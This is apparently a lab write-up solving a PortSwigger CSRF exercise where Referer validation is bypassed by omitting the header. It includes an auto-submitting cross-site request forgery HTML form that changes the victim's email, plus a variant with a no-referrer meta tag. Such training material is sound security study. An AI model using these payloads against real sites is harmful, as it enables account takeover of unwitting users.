## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/21c61afd-274f-4636-8c3c-2840f7821103)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6857b503-92b8-4c62-8138-224640b5d51c)

Send the request to Burp Repeater and Generte the payload.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a672d830-b044-4851-8ecd-858befa84410)

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0ad9009304620fba86918f28001a0026.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="cyber2&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```
when  viewing  the exploit it will show as invalid `Referer header`. 

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6b87dd95-518b-44cb-9834-79870d0d0f2a)

Then Delete the Referer header entirely and observe that the request is now accepted.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4619027b-2461-4fe6-aec2-4015de18bbdd)

request worked.

Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:

```html
<meta name="referrer" content="no-referrer">
```
now Generte the payload an insert this payload in that.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/cda028ac-cb10-4eb8-a18d-e88c26f4d2ff)

now view  the exploit

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5f9fa9c7-21f0-4e3a-b13d-24b7f0b2dffc)

mail is changed.

Payload-

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <meta name="referrer" content="no-referrer">

    <form action="https://0ad9009304620fba86918f28001a0026.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="cybe99r&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```

Store the exploit, then click "Deliver to victim" to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/747275fb-9f6f-4b6f-a9d8-a315ac49ba03)

